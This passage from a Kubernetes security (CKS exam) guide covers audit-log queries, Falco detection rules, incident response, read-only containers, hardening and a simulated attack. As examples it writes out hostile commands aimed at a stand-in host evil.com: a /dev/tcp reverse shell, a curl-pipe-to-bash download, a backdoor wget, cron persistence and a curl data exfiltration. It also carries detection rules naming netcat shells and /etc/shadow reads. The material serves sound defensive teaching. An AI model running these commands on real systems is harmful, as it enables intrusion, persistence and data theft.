cat audit.log | jq 'select(.verb=="create" and .objectRef.subresource=="exec")'

# Find all denied requests (attackers probing)
cat audit.log | jq 'select(.responseStatus.code>=400)'

# Find ClusterRoleBinding creation (privilege escalation!)
cat audit.log | jq 'select(.objectRef.resource=="clusterrolebindings" and .verb=="create")'

28.4 Shipping Audit Logs to External Systems

For production, ship audit logs to a centralized SIEM (Elasticsearch, Splunk, Datadog). Configure a webhook backend or use a logging agent (Fluentd, Filebeat) to forward audit logs in real-time.

28.5 Detecting Suspicious Activity from Audit Logs

Red flags to watch for in audit logs — these are the signs of an active attack or reconnaissance:

Suspicious ActivityWhy It's Dangerousjq Query Pattern
Access to secrets by unexpected users/SAsAttacker stealing credentialsselect(.objectRef.resource=="secrets")
exec into pods (pods/exec verb) unexpectedlyAttacker getting interactive shellselect(.objectRef.subresource=="exec")
Creating ClusterRoleBindingsPrivilege escalation — creating permanent backdoorselect(.objectRef.resource=="clusterrolebindings" and .verb=="create")
Accessing /etc/kubernetes/ pathsAttempting to read API server credentialsselect(.requestURI | contains("/etc/kubernetes"))
Deleting audit log entriesCovering tracks — tampering indicatorselect(.verb=="delete" and .objectRef.resource=="events")
🎯 CKS Exam Tip — Audit Policy Rules DOMINATE the Exam

The CKS exam WILL ask you to configure an audit policy. Key facts: rules are evaluated in order — first match wins. More specific rules must come BEFORE general rules. A common trap: putting level: Metadata as the first rule — it matches ALL requests, so subsequent rules are never reached. Always put None (exclusions) first, then RequestResponse (detailed), then Metadata (default).

Chapter 29: Falco — Runtime Threat Detection in Real-Time

Falco monitors Linux system calls in real-time to detect suspicious container behavior. Unlike audit logs (API-level), Falco sees INSIDE containers at the OS level — shell spawns, file reads, network connections. It's your runtime security camera, watching every container 24/7.

🔴 Advanced⏱️ ~2 hours🔧 Hands-On🎯 Falco
🎓 CKS Relevance
Monitoring & Runtime Security 20%

29.1 What Is Falco and Why It's CKS Critical?

🦅 Falco — Your 24/7 Container Security Camera

Think of Falco as a motion-activated security camera inside every container. It doesn't know what your app SHOULD do — it watches for what should NEVER happen: shells, sensitive file reads, network connections to unknown IPs. When it sees something wrong, it alerts instantly.

Falco vs Audit Logging — Complementary Tools
  📋 AUDIT LOGGING                      🦅 FALCO
  ────────────────                      ────────
  Sees: API server calls                Sees: Kernel syscalls
  "kubectl exec into pod"               "bash shell spawned in container"
  "Secret read by user X"               "cat /etc/shadow inside pod"
  "Deployment updated"                  "nc -e /bin/bash (reverse shell!)"
  
  BEFORE the attacker acts:             WHILE the attacker acts:
  Shows HOW they got in                 Shows WHAT they're DOING
  
  🛡️  TOGETHER: Complete picture of the entire attack lifecycle

29.2 Falco Architecture

Kernel Module (kmod) vs eBPF Probe

Kernel Module (kmod)

Traditional driver loaded into kernel. Fast and efficient but requires kernel headers and a kernel module load. Used on systems without eBPF support.

eBPF Probe (Modern)

Safer — no kernel module needed. Uses eBPF programs to hook syscalls. CO-RE (Compile Once, Run Everywhere) compatible. Recommended for production.

Event Flow: Kernel → Driver → Engine → Output

🐧 Kernel syscall → 🔌 Driver (kmod/eBPF) → ⚙️ Falco Engine (rules match) → 📤 Output (stdout/file/webhook/gRPC)

Output Channels

Configured in /etc/falco/falco.yaml: stdout (default), file, HTTP webhook (Slack, PagerDuty), gRPC (falcosidekick for fan-out).

29.3 Falco Rules — Writing and Reading Them

Rule Anatomy: condition + output + priority + tags

- rule: Unexpected Shell in anihpj Container
  desc: Detect shell spawned in Django container
  condition: >
    spawned_process and
    container.name = "anihpj" and
    proc.name in (shell_binaries)
  output: >
    Shell in anihpj! (user=%user.name cmd=%proc.cmdline)
  priority: CRITICAL
  tags: [anihpj, shell, CKS]

Custom Rule: Unexpected Shell in anihpj Container

Django containers should NEVER spawn interactive shells. If bash/sh appears, it's either an attacker or a misconfiguration — both need investigation.

Macros and Lists for Reusable Conditions

- macro: anihpj_container
  condition: container.name = "anihpj"
- list: shell_binaries
  items: [bash, sh, zsh, ksh, dash]

29.4 Built-In Falco Rules You Must Know for CKS

Rule NameWhat It Detects
Terminal shell in containerbash/sh spawned inside a container
Read sensitive file untrustedcat/less of /etc/shadow, /etc/passwd
Write below etcAny write to /etc/ inside container (tampering)
Contact K8s API from containercurl/wget to kubernetes.default.svc
Launch privileged containerNew container with privileged: true
Netcat remote code executionnc with -e flag (reverse shell backdoor)
Run shell untrustedShell in unexpected process — not in expected list
Clear log activitiesrm/truncate of log files — covering tracks
Create files below /devUnusual writes to /dev/* — malware staging
Unexpected outbound connectionConnection to non-approved external IPs or C2C

📋 Falco Rule Fields Quick Reference — For Writing Exam Rules

FieldExample ValueWhat It Matches
spawned_processtrue/falseIs this a new process being created?
container.name"anihpj", "postgres"Name of the container
container.image"registry.anihpj.com/anihpj:v2"Full image reference
proc.name"bash", "sh", "nc", "cat"Process binary name
proc.cmdline"cat /etc/shadow"Full command line
fd.name"/etc/shadow"File being accessed
user.name"root", "anihpj"User running the process
evt.type"open", "execve"System call type
k8s.ns.name"anihpj-prod"Kubernetes namespace
shell_binariesbash, sh, zsh, ksh, dashMacro/list of shell binaries

29.5 CKS Exam Tasks: Modifying Falco Rules

Adding Exception Macros — Reduce False Positives

- macro: allowed_anihpj_processes
  condition: proc.name in (gunicorn, python3, nginx)

Changing Alert Output Format — JSON for SIEM

# In /etc/falco/falco.yaml:
json_output: true
json_include_output_property: true
🚨 Real Falco Alert Examples — What Attacks Look Like

Here are real Falco alert outputs showing actual attack patterns. Being able to read these is a CKS exam skill:

  🔴 REVERSE SHELL ATTACK:
  ──────────────────────
  Output: Shell spawned in container (user=root container=anihpj 
          cmd=bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1')
  → Attacker is creating an interactive reverse shell to evil.com!
  
  🔴 CREDENTIAL THEFT:
  ────────────────────
  Output: Sensitive file opened for reading by untrusted program
          (file=/etc/shadow container=anihpj proc=cat)
  → Someone is trying to read the password file!
  
  🔴 CRYPTO MINER DEPLOYMENT:
  ──────────────────────────
  Output: Write below etc (file=/etc/cron.d/miner container=anihpj)
  → Attacker is installing a persistent cron job — crypto miner!
  
  🔴 API EXPLORATION:
  ──────────────────
  Output: Contact K8s API server from container
          (container=compromised-pod proc=curl cmd=curl -k https://kubernetes.default.svc/api/v1/secrets)
  → Compromised pod is trying to read all Secrets from the API!

Chapter 30: Detecting and Responding to Security Incidents

When Falco alerts — shell in your production pod — what do you do? This chapter covers the incident response lifecycle in Kubernetes: confirm, contain, investigate, eradicate, recover, and learn.

🔴 Advanced⏱️ ~1 hour🔧 Hands-On🎯 IR

30.1 The Incident Response Lifecycle in Kubernetes

🕐 Real Scenario: 3:14 AM — Falco Alerts "Shell in anihpj Container"

Step-by-Step: How a SOC Analyst Responds
  ⏰ 03:14:22 — PagerDuty wakes up the on-call engineer
              — Falco alert: "Shell spawned in anihpj container (user=root cmd=/bin/bash)"
  
  ⏰ 03:14:30 — CONFIRM: Is this a scheduled maintenance? No.
              — kubectl exec anihpj-xxx -- ps aux
              — Shows: /bin/bash, curl http://evil.com/malware.sh | bash
              — VERDICT: Active attack in progress 🔴
  
  ⏰ 03:14:45 — CONTAIN: Apply emergency deny-all NetworkPolicy
              — Pod isolated. Attacker cannot reach DB or internet.
  
  ⏰ 03:15:00 — INVESTIGATE: Capture forensic evidence
              — Pod YAML saved, process list captured, network connections logged
  
  ⏰ 03:16:00 — ERADICATE: Force-delete compromised pod
              — Deployment recreates clean pod from trusted registry image
  
  ⏰ 03:17:00 — RECOVER: Rotate database credentials
              — Attacker may have read DB password from env vars
  
  ⏰ 03:30:00 — LEARN: Post-incident review
              — How did they get in? (CVE in Pillow library)
              — Why were DB creds in env vars? (Move to Vault/Secrets)
              — Why no egress NetworkPolicy? (Add default-deny egress)
  
  ⏱️  TOTAL RESPONSE TIME: ~16 minutes — from alert to resolution
  ✅ Zero data exfiltrated (egress blocked during containment)
  ✅ Credentials rotated before attacker could use them

  🚨 ALERT: "Shell spawned in anihpj container"
       │
       ▼
  ┌─ 1. CONFIRM ──────────────────────────────────────────┐
  │ kubectl describe pod anihpj-xxx                        │
  │ kubectl logs anihpj-xxx --tail=50                      │
  │ kubectl exec anihpj-xxx -- ps aux                      │
  │ → Is this a legitimate debug session or an attack?     │
  └────────────────────────┬───────────────────────────────┘
                           │ ❌ NOT legitimate
                           ▼
  ┌─ 2. CONTAIN ──────────────────────────────────────────┐
  │ kubectl apply -f emergency-deny-all.yaml               │
  │ → Pod is isolated — cannot reach anything              │
  └────────────────────────┬───────────────────────────────┘
                           ▼
  ┌─ 3. INVESTIGATE ──────────────────────────────────────┐
  │ kubectl get pod anihpj-xxx -o yaml > forensic.yaml    │
  │ kubectl exec anihpj-xxx -- netstat -tlnp               │
  │ kubectl exec anihpj-xxx -- ls -la /tmp /root           │
  └────────────────────────┬───────────────────────────────┘
                           ▼
  ┌─ 4. ERADICATE ────────────────────────────────────────┐
  │ kubectl delete pod anihpj-xxx --force --grace-period=0 │
  │ → Deployment recreates clean pod from trusted image    │
  └────────────────────────┬───────────────────────────────┘
                           ▼
  ┌─ 5. RECOVER + LEARN ──────────────────────────────────┐
  │ Update NetworkPolicy, add Falco rule, rotate creds     │
  │ Post-incident review: How did they get in?             │
  └────────────────────────────────────────────────────────┘
1
Confirm

Is this legitimate? Check pod logs, running processes. Rule out authorized debugging.

2
Contain

Apply emergency deny-all NetworkPolicy. Pod is isolated but still running for forensics.

3
Investigate

Capture pod spec, running processes, network connections, filesystem changes.

4
Eradicate

Force-delete compromised pod. Deployment recreates clean pod from trusted registry.

5
Recover + Learn

Update policies, rotate credentials, add Falco rules. Post-incident review.

30.2 Isolating a Compromised Pod Without Deleting It

# Remove pod from Service (stop traffic)
kubectl label pod anihpj-xxx app-

# Apply emergency NetworkPolicy — deny all traffic
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: emergency-isolate, namespace: anihpj-prod}
spec:
  podSelector: {matchLabels: {app: anihpj}}
  policyTypes: [Ingress, Egress]
  # Empty ingress + egress = deny ALL traffic

30.3 Forensic Investigation of a Kubernetes Pod

# Capture pod spec for forensic analysis
kubectl get pod anihpj-xxx -o yaml > forensic-pod.yaml
# Check running processes inside the pod
kubectl exec anihpj-xxx -- ps aux
# Check network connections
kubectl exec anihpj-xxx -- netstat -tlnp
# Check for suspicious files
kubectl exec anihpj-xxx -- find / -mtime -1 -type f 2>/dev/null

Chapter 31: Immutable Containers — Read-Only Filesystems

An immutable container's filesystem is read-only — nothing can be modified after deployment. This prevents attackers from writing backdoors, modifying binaries, or tampering with configuration. Changes must go through CI/CD and image rebuild.

🔴 Advanced⏱️ ~45 min🔧 Hands-On🎯 Immutability

31.1 Why Immutability Is a Security Property

An attacker who can write to the container filesystem can: replace binaries with backdoored versions, write malware to cron, or modify configuration to open backdoors. An immutable container prevents ALL of these.

📦 The Sealed Shipping Container Analogy

Mutable vs Immutable — What Attackers Can and Cannot Do
   🔴 MUTABLE CONTAINER                     ✅ IMMUTABLE CONTAINER
   (writable filesystem)                    (readOnlyRootFilesystem)
   ─────────────────────                    ─────────────────────────
   
   Attacker gains shell:                    Attacker gains shell:
   
   1. wget http://evil.com/backdoor        1. wget http://evil.com/backdoor
      → Downloads backdoor ✅                  → Cannot write to / ❌
                                              → "Read-only filesystem"
   2. mv backdoor /usr/bin/gunicorn
      → Replaces app binary ✅             2. Can't modify any binary ❌
   
   3. echo "* * * * * /tmp/miner" >> cron  3. Can't modify /etc/crontab ❌
      → Installs crypto miner ✅
   
   4. vi /app/settings.py                  4. Can only read settings.py ✅
      → Changes SECRET_KEY to known value      → But can't change it ❌
   
   💀 Attacker OWNS the container           🛡️  Attacker is TRAPPED
      Can persist, pivot, and destroy          Can't change anything
   
   🛡️  FIX: readOnlyRootFilesystem: true
      + volumeMounts for writable dirs (/tmp, /app/media)
      + CI/CD rebuilds image for ANY change

31.2 Enforcing Read-Only Filesystems in Kubernetes

securityContext:
  readOnlyRootFilesystem: true     # / is read-only
volumeMounts:
- {name: media, mountPath: /app/media}    # Writable for uploads
- {name: tmp, mountPath: /tmp}            # Django needs /tmp
volumes:
- {name: media, persistentVolumeClaim: {claimName: anihpj-media-pvc}}
- {name: tmp, emptyDir: {}}

31.3 Using Pod Security Standards to Enforce Immutability

PSS Restricted encourages readOnlyRootFilesystem. Combine with Kyverno to require it cluster-wide for all production pods.

Chapter 32: Compliance & Continuous Security Monitoring

One-time hardening is not enough — new vulnerabilities appear daily. Continuous monitoring keeps your cluster secure over time with automated scanning, policy compliance checks, and security dashboards.

🔴 Advanced⏱️ ~1 hour📖 Concepts🎯 Compliance

32.1 Continuous Security Scanning — Keeping the Cluster Clean

Trivy Operator runs in-cluster, continuously scanning images for new CVEs. When a CVE like Log4Shell is announced, it alerts you immediately — no waiting for the next release cycle.

32.2 Security Benchmarking in CI/CD

Run kube-bench on a schedule (CronJob) to detect configuration drift. Alert when a previously-passing check now fails — something changed and needs investigation.

32.3 Policy Compliance with OPA/Gatekeeper

Gatekeeper audit mode checks existing resources against policies without blocking them. Use Constraint status reports to find and remediate violations that existed before the policy was created.

32.4 Security Metrics and Dashboards

Expose security metrics to Prometheus + Grafana: CVE counts by severity, policy violations by namespace, Falco alert rates, audit log event volume. Define SLOs: "Zero CRITICAL CVEs in production," "NetworkPolicy coverage = 100% of namespaces."

Chapter 33: Complete Security Hardening of anihpj/jobpost

This chapter brings everything together. We start with an unsecured anihpj cluster running with all default (insecure) settings, and systematically apply every security control learned in Parts 1-7. By the end, anihpj is CKS-hardened and production-ready.

🔴 Advanced⏱️ ~3 hours🔧 Hands-On🎯 End-to-End

33.1 The Starting Point — An Unsecured anihpj Cluster

What Attackers See vs What They Should See

😰 anihpj BEFORE Hardening — What Attackers Can Do
  • 🔴 Read all Secrets — base64-encoded in etcd, no encryption
  • 🔴 Exec into any pod — anonymous API access, overpermissive RBAC
  • 🔴 Reach any service — no NetworkPolicy, flat open network
  • 🔴 Install crypto miners — containers run as root, writable filesystem
  • 🔴 Steal cloud credentials — IAM keys in plaintext env vars
  • 🔴 No detection — no audit logs, no Falco, no alerts
  • 📊 kubesec score: 2/10 — essentially undefended
🎉 anihpj AFTER CKS Hardening — What Attackers Face
  • ✅ Secrets encrypted — AES-GCM at rest, unreadable even from etcd
  • ✅ No anonymous access — --anonymous-auth=false, RBAC least privilege
  • ✅ Default-deny network — only 5 allowed paths, everything else blocked
  • ✅ Non-root, read-only FS — attacker can't write binaries or cron jobs
  • ✅ Cloud credentials in Vault — dynamic, time-limited, auto-rotated
  • ✅ Immediate detection — Falco alerts + audit logs + PagerDuty
  • 📊 kubesec score: 8/10 — CKS-hardened, production-ready

📈 Kubernetes Security Maturity Ladder — From Insecure to Enterprise

Where Are You Now? Where Should You Be?
LEVEL 0: INSECURE
  • Pods run as root
  • No NetworkPolicy
  • No image scanning
  • Plaintext secrets
  • No audit logging
  • Anonymous API access
kubesec: 0-2/10 🔴
LEVEL 1: BASIC
  • RBAC least privilege
  • runAsNonRoot: true
  • PSS Baseline enforced
  • TLS on Ingress
  • Private registry
  • Default-deny NetPol
kubesec: 4-5/10 🟡
LEVEL 2: CKS-HARDENED
  • Seccomp RuntimeDefault
  • AppArmor profiles
  • Read-only root FS
  • Drop ALL capabilities
  • Encryption at rest
  • Falco + Audit logging
  • Immutability enforced
kubesec: 7-8/10 🟢
LEVEL 3: ENTERPRISE
  • cosign image signing
  • SBOM per build
  • mTLS all traffic
  • Vault external secrets
  • gVisor/Kata sandboxes
  • Grafana dashboards
  • GitOps policy sync
kubesec: 9-10/10 🔵
🔴 Default K8s───── ▲ ─────🟡 Minimum Prod───── ▲ ─────🟢 CKS Target───── ▲ ─────🔵 Beyond CKS

🎓 This guide takes you: Level 0 → Level 1 → Level 2 (CKS-ready) → Level 3 (production best practices you'll understand)

💡 CKS Exam Perspective

On the CKS exam, you start at Level 0 or 1 and your task is to reach Level 2. The exam doesn't test Level 3 concepts (cosign, SBOM, mTLS, Vault) as hands-on tasks — but knowing them shows you understand the complete security picture. Focus your hands-on practice on the Level 0→2 transition: that's where the scored tasks live.

🗺️ The 7-Step Hardening Roadmap

1
Image & Supply Chain

Minimal base, multi-stage build, Trivy scan, cosign sign

2
Security Context

Non-root, RO-FS, drop caps, Seccomp, AppArmor

3
Admission Control

PSS Restricted, Kyverno verifyImages

4
RBAC & SAs

Dedicated SAs, least privilege, automount=false

Default-deny NetPol, allow only needed paths

33.2 Step 1 — Secure the Image and Supply Chain

Build a minimal image with python:3.12-alpine, multi-stage build, Trivy scan for zero CRITICAL CVEs, cosign sign in CI, Kyverno verifyImages at admission.

# Hardened multi-stage Dockerfile
FROM python:3.12-alpine AS builder
RUN apk add --no-cache build-base postgresql-dev
COPY requirements.txt .
RUN pip install --user -r requirements.txt
FROM python:3.12-alpine
RUN addgroup -S anihpj && adduser -S anihpj -G anihpj
COPY --from=builder /root/.local /home/anihpj/.local
COPY . /app
USER anihpj
ENV PATH=/home/anihpj/.local/bin:$PATH

33.3 Step 2 — Harden the Pod Security Context

securityContext:                # Pod-level
  runAsNonRoot: true
  runAsUser: 1000
  runAsGroup: 1000
  fsGroup: 1000
  seccompProfile: {type: RuntimeDefault}
containers:
- name: anihpj
  securityContext:              # Container-level
    allowPrivilegeEscalation: false
    readOnlyRootFilesystem: true
    capabilities: {drop: ["ALL"]}
    appArmorProfile: {type: Localhost, localhostProfile: anihpj-django}

33.4 Step 3 — Namespace and Admission Control

Apply PSS Restricted enforcement to anihpj-prod (production), PSS Baseline to anihpj-dev (development flexibility). Deploy Kyverno with verifyImages for cosign signatures — only signed images reach the cluster.

Namespace PSS labels + Kyverno verifyImages
# anihpj-prod: RESTRICTED (maximum security)
apiVersion: v1
kind: Namespace
metadata:
  name: anihpj-prod
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
---
# anihpj-dev: BASELINE (developer flexibility)
apiVersion: v1
kind: Namespace
metadata:
  name: anihpj-dev
  labels:
    pod-security.kubernetes.io/enforce: baseline
---
# Kyverno: verify cosign signature on ALL anihpj images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: {name: verify-anihpj-signatures}
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-cosign
    match: {resources: {kinds: [Pod]}}
    verifyImages:
    - imageReferences: ["registry.anihpj.com/*"]
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQc...
              -----END PUBLIC KEY-----

33.5 Step 4 — RBAC and Service Accounts

Create dedicated ServiceAccounts for each workload. Disable automount for pods that don't need API access (anihpj, postgres). Create minimal Roles for CI/CD and operators. Verify with kubectl auth can-i.

anihpj RBAC — production ServiceAccounts + Roles
# anihpj SA: no API access needed
apiVersion: v1
kind: ServiceAccount
metadata: {name: anihpj-sa, namespace: anihpj-prod}
automountServiceAccountToken: false
---
# postgres SA: no API access needed
apiVersion: v1
kind: ServiceAccount
metadata: {name: postgres-sa, namespace: anihpj-prod}
automountServiceAccountToken: false
---
# CI/CD role: update Deployments only
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: deployer, namespace: anihpj-prod}
rules:
- apiGroups: [apps]
  resources: [deployments]
  verbs: [get, list, update, patch]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: deployer-binding, namespace: anihpj-prod}
subjects:
- kind: ServiceAccount; name: ci-deployer-sa; namespace: anihpj-prod
roleRef: {kind: Role, name: deployer, apiGroup: rbac.authorization.k8s.io}
# Verify least privilege
kubectl auth can-i get pods --as=system:serviceaccount:anihpj-prod:anihpj-sa
# → no ✅ (anihpj SA has NO API access!)
kubectl auth can-i update deployments -n anihpj-prod --as=system:serviceaccount:anihpj-prod:ci-deployer-sa
# → yes ✅ (CI/CD can update deployments)

33.6 Step 5 — Network Isolation

Apply default-deny-all NetworkPolicy to anihpj-prod. Then explicitly allow only the 5 required communication paths.

anihpj NetworkPolicy — Zero-Trust Networking
# Policy 1: Default deny all ingress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: default-deny-ingress, namespace: anihpj-prod}
spec: {podSelector: {}, policyTypes: [Ingress]}
---
# Policy 2: Ingress Controller → anihpj (port 8000)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: allow-ingress-to-anihpj, namespace: anihpj-prod}
spec:
  podSelector: {matchLabels: {app: anihpj}}
  policyTypes: [Ingress]
  ingress:
  - from: [{namespaceSelector: {matchLabels: {name: ingress-nginx}}}]
    ports: [{protocol: TCP, port: 8000}]
---
# Policy 3: anihpj → PostgreSQL (port 5432)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: allow-anihpj-to-postgres, namespace: anihpj-prod}
spec:
  podSelector: {matchLabels: {app: postgres}}
  policyTypes: [Ingress]
  ingress:
  - from: [{podSelector: {matchLabels: {app: anihpj}}}]
    ports: [{protocol: TCP, port: 5432}]
---
# Policy 4: anihpj → Redis (port 6379)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: allow-anihpj-to-redis, namespace: anihpj-prod}
spec:
  podSelector: {matchLabels: {app: redis}}
  policyTypes: [Ingress]
  ingress:
  - from: [{podSelector: {matchLabels: {app: anihpj}}}]
    ports: [{protocol: TCP, port: 6379}]
---
# Policy 5: All pods → DNS (UDP 53)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: allow-dns-egress, namespace: anihpj-prod}
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to: [{namespaceSelector: {}}]
    ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]
---
# Policy 6: Monitoring → all pods (port 9090)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: allow-monitoring, namespace: anihpj-prod}
spec:
  podSelector: {}
  policyTypes: [Ingress]
  ingress:
  - from: [{namespaceSelector: {matchLabels: {name: monitoring}}}]
    ports: [{protocol: TCP, port: 9090}]

33.7 Step 6 — Secrets Encryption

Enable AES-GCM encryption at rest for Secrets. After enabling, rotate all existing Secrets to encrypt them. Verify that direct etcd reads return encrypted (not plaintext) data.

EncryptionConfiguration + rotation
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources: [secrets]
  providers:
  - aesgcm:
      keys:
      - name: key1
        secret: <base64-32-byte-key>
  - identity: {}  # Fallback during migration
# Add to kube-apiserver.yaml:
--encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# Rotate ALL existing Secrets to encrypt them:
kubectl get secrets --all-namespaces -o json | kubectl replace -f -

# Verify: direct etcd read shows ENCRYPTED data
ETCDCTL_API=3 etcdctl get /registry/secrets/anihpj-prod/db-creds
# → Encrypted blob (NOT plaintext!) ✅

# Bonus: Vault integration for Django SECRET_KEY
# Store in Vault, inject via Vault Agent sidecar:
# vault kv put secret/anihpj/django SECRET_KEY="django-xyz..."

33.8 Step 7 — Runtime Monitoring

Deploy Falco with custom rules for anihpj. Create rules to detect shells, unexpected outbound connections, and sensitive file reads. Configure audit policy for secret access and pod exec.

Custom Falco rules + audit policy for anihpj
# /etc/falco/falco_rules.local.yaml
- rule: Shell in anihpj Container
  desc: Detect shell spawned in Django container
  condition: >
    spawned_process and container.name = "anihpj"
    and proc.name in (shell_binaries)
  output: >
    SHELL IN ANIHPJ! user=%user.name cmd=%proc.cmdline
    container=%container.name
  priority: CRITICAL
  tags: [anihpj, shell]

- rule: Unexpected Outbound from anihpj
  desc: Detect connections to external IPs
  condition: >
    outbound and container.name = "anihpj"
    and not fd.sip.name in (postgres_ip, redis_ip, dns_ip)
  output: >
    Unexpected outbound! %container.name → %fd.rip:%fd.rport
  priority: WARNING
  tags: [anihpj, network]
# Audit policy: log secret access + pod exec
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  resources: [{group: "", resources: [secrets]}]
- level: RequestResponse
  resources: [{group: "", resources: [pods/exec]}]
- level: Metadata

Chapter 34: Incident Response — Simulating and Reacting to an Attack

Let's simulate a real attack on anihpj and watch every security layer respond. An attacker exploits a CVE in an old Pillow library version to gain code execution — and our CKS defenses block them at every turn.

🔴 Advanced⏱️ ~1.5 hours🔧 Hands-On🎯 IR Simulation

34.1 Simulated Attack Scenario — anihpj Under Attack

🎯 ATTACKER GOAL: Steal user data from the anihpj database

An attacker exploits CVE-2023-XXXX in an old Pillow 9.0.0 library to gain code execution. Watch how CKS-hardened defenses respond at every layer.

1
🔴 ATTACKER: Crafted PNG Upload

Uploads a crafted PNG to /jobs/upload/ triggering buffer overflow in Pillow 9.0.0 → gains shell inside the anihpj container

curl -X POST https://anihpj.com/jobs/upload/ \
  -F "image=@exploit.png" \
  -F "title=evil"
# → CVE triggers → shell gained 🚨
▶
⚠️ BREACHED

Step 1 succeeds — attacker has code execution. The CVE was in a base image dependency. But every subsequent action hits a wall...

2
🟡 ATTACKER: Read /etc/passwd

Attacker enumerates system users to plan privilege escalation

cat /etc/passwd
cat /etc/shadow  # blocked by AppArmor
id              # uid=0(root) — confirming root access
▶
🚨 DETECTED by Falco

"Read sensitive file untrusted"
user=root | file=/etc/passwd
container=anihpj | priority=WARNING

3
🟢 ATTACKER: curl to postgres

Tries lateral movement to reach the database

curl http://postgres-service:5432
# → Connection timeout (packet dropped)
▶
🛡️ BLOCKED by NetworkPolicy

podSelector: {app: anihpj}
Attacker's pod label doesn't match → DENIED

4
🟢 ATTACKER: Write backdoor to /etc/cron.d

Tries to install persistence via cron job

echo "* * * * * /tmp/backdoor.sh" \
  > /etc/cron.d/backdoor
# → bash: /etc/cron.d/backdoor:
#   Read-only file system
▶
🛡️ BLOCKED by readOnlyRootFS

readOnlyRootFilesystem: true
Filesystem is immutable → DENIED

5
🟢 ATTACKER: curl to evil.com

Last resort — tries to exfiltrate stolen data

curl http://evil.com/exfil \
  -d "$(cat /app/data/*)"
# → Could not resolve host: evil.com
#   (DNS not in egress allowlist)
▶
🛡️ BLOCKED by Egress NetPol

Only DNS (UDP:53) egress allowed
All other outbound → DENIED

🏁 RESULT: Code Execution Achieved — Attack FAILED

The attacker got a shell inside the container (Step 1), but accomplished NOTHING. Every malignant action hit a hardened defense:

🔴 CVE exploited→🚨 Falco detected (Step 2)
🔴 Lateral to DB→🛡️ NetworkPolicy blocked (Step 3)
🔴 Persist via cron→🛡️ readOnlyRootFS blocked (Step 4)
🔴 Exfiltrate data→🛡️ Egress NetPol blocked (Step 5)

💡 Defense in depth works: even when one layer fails, the others hold the line.

34.2 Detection — How Each Security Layer Catches It

Attack StepSecurity LayerResult
Crafted PNG uploadTrivy Operator⚠️ CVE alert (image was already flagged)
Read /etc/passwdFalco🚨 Alert fired immediately
curl to postgresNetworkPolicy❌ Blocked — only anihpj pod allowed
Write to /etc/cron.dreadOnlyRootFS❌ Blocked — filesystem is read-only
curl to external IPNetworkPolicy egress❌ Blocked — no egress allowed

34.3 Response — Containing and Recovering anihpj

# 1. Isolate compromised pod
kubectl label pod anihpj-xxx app-    # Remove from Service
kubectl apply -f emergency-deny-all.yaml  # Emergency NetworkPolicy

# 2. Capture forensic evidence
kubectl get pod anihpj-xxx -o yaml > forensic.yaml
kubectl exec anihpj-xxx -- ps aux > processes.txt
kubectl exec anihpj-xxx -- netstat -tlnp > connections.txt

# 3. Eradicate
kubectl delete pod anihpj-xxx --force --grace-period=0
# Deployment recreates clean pod from trusted image

# 4. Fix root cause + redeploy
# Update Pillow, rebuild image, Trivy scan, cosign sign, deploy

34.4 Post-Incident — Strengthening the Security Posture

✅ Post-Incident Improvements
  • ➕ Falco rule: alert on ANY exec to anihpj pod (even authorized)
  • ➕ Tighten NetworkPolicy: block ALL outbound except postgres + redis + DNS
  • ➕ Trivy CI gate: fail on HIGH severity (not just CRITICAL)
  • ➕ Schedule weekly kube-bench CronJob to detect configuration drift
  • ➕ Add SBOM generation to every build for CVE lookup speed
  • ➕ Rotate all credentials — assume attacker read env vars
🎯 CKS Exam Simulation — This Chapter IS the Exam

The CKS exam is essentially asking you to do what Chapter 33 covers: harden a running cluster step by step. You'll be given a cluster with security issues and asked to fix them. The 7-step roadmap above IS your exam strategy: start with the image/build, then SecurityContext, then admission, then RBAC, then networking, then secrets, then monitoring. Work in this order — each step builds on the previous. If you can complete all 7 steps on a practice cluster within 2 hours, you're CKS-ready.

Chapter 35: Security Automation and GitOps for anihpj

Security that lives only in your head is not security at all. GitOps puts all security configurations in Git — RBAC, NetworkPolicy, PSS labels, Falco rules, OPA policies. Changes go through PR review, and ArgoCD ensures the cluster matches Git. No more manual "I think I fixed that."

🔴 Advanced⏱️ ~1 hour📖 Concepts🎯 GitOps

35.1 GitOps Security — Why Security Should Live in Git

Security that lives only in your head is not security at all. GitOps stores ALL security configurations as code: RBAC, NetworkPolicy, PSS labels, Falco rules, OPA policies. Every change gets a PR review, every deployment has an audit trail.

GitOps Security Loop — Code → Review → Deploy → Verify
  👨‍💻 Security Engineer                 ☸️ Kubernetes Cluster
       │                                        │
       │ git commit -m "Add Falco rule"        │
       ▼                                        │
  ┌─────────┐    ┌─────────┐    ┌──────────┐   │
  │ Git Repo │───→│ PR      │───→│ Merge to │   │
  │ (source) │    │ Review  │    │ main     │   │
  └─────────┘    └─────────┘    └────┬─────┘   │
                                     │          │
                              ArgoCD detects    │
                              change + syncs    │
                                     │          │
                                     ▼          │
                              ┌──────────┐      │
                              │ Cluster  │──────┘
                              │ matches  │  Drift detected?
                              │ Git      │  → Auto-correct OR alert
                              └──────────┘
  
  📁 What lives in Git:
